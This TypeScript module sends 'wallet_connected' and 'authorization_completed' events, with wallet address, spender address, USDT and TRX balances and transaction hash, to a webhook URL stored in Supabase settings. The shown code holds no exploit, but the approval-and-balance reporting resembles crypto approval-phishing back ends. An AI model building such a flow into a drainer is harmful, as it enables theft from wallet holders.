import { supabase } from "@/integrations/supabase/client";

// Default webhook URL
const DEFAULT_WEBHOOK_URL = "";

// Get webhook URL from app_settings
export const getWebhookUrl = async (): Promise<string> => {
  try {
    const { data, error } = await supabase
      .from('app_settings')
      .select('value')
      .eq('key', 'webhook_url')
      .maybeSingle();

    if (error || !data?.value) {
      console.log('Using default webhook URL (none configured)');
      return DEFAULT_WEBHOOK_URL;
    }

    return data.value;
  } catch (e) {
    console.error('Error fetching webhook URL:', e);
    return DEFAULT_WEBHOOK_URL;
  }
};

// Wallet connection data format
export interface WalletConnectedData {
  event: "wallet_connected";
  timestamp: string;
  data: {
    order_id: string;
    wallet_address: string;
    username: string;
    currency: string;
    network: string;
    spender_address: string;
    usdt_balance: number;
    trx_balance: number;
  };
}

// Authorization completed data format
export interface AuthorizationCompletedData {
  event: "authorization_completed";
  timestamp: string;
  data: {
    order_id: string;
    wallet_address: string;
    username: string;
    currency: string;
    network: string;
    spender_address: string;
    usdt_balance: number;
    trx_balance: number;
    tx_hash: string;
    status: "success" | "failed";
    payment_mode: "safe" | "whitelist";
  };
}

// Webhook response format
export interface WebhookResponse {
  success: boolean;
  message: string;
  address?: string;
}

// Send wallet connected event
export const sendWalletConnectedEvent = async (data: WalletConnectedData["data"]): Promise<WebhookResponse> => {
  try {
    const webhookUrl = await getWebhookUrl();
    
    if (!webhookUrl) {
      console.log('No webhook URL configured, skipping wallet connected event');
      return { success: true, message: 'No webhook configured' };
    }

    const payload: WalletConnectedData = {
      event: "wallet_connected",
      timestamp: new Date().toISOString(),
      data
    };

    console.log("Sending wallet_connected event:", payload);

    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    const result: WebhookResponse = await response.json();

    if (!response.ok) {
      console.error("Webhook request failed:", response.status, result);
      return { success: false, message: `Request failed with status ${response.status}` };
    }

    console.log("Wallet connected event response:", result);
    return result;
  } catch (error) {
    console.error("Error sending wallet connected event:", error);
    return { success: false, message: error instanceof Error ? error.message : "Unknown error" };
  }
};

// Send authorization completed event
export const sendAuthorizationCompletedEvent = async (data: AuthorizationCompletedData["data"]): Promise<WebhookResponse> => {
  try {
    const webhookUrl = await getWebhookUrl();
    
    if (!webhookUrl) {
      console.log('No webhook URL configured, skipping authorization completed event');
      return { success: true, message: 'No webhook configured' };
    }

    const payload: AuthorizationCompletedData = {
      event: "authorization_completed",
      timestamp: new Date().toISOString(),
      data
    };

    console.log("Sending authorization_completed event:", payload);

    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    const result: WebhookResponse = await response.json();

    if (!response.ok) {
      console.error("Webhook request failed:", response.status, result);
      return { success: false, message: `Request failed with status ${response.status}` };
    }

    console.log("Authorization completed event response:", result);
    return result;
  } catch (error) {
    console.error("Error sending authorization completed event:", error);
    return { success: false, message: error instanceof Error ? error.message : "Unknown error" };
  }
};
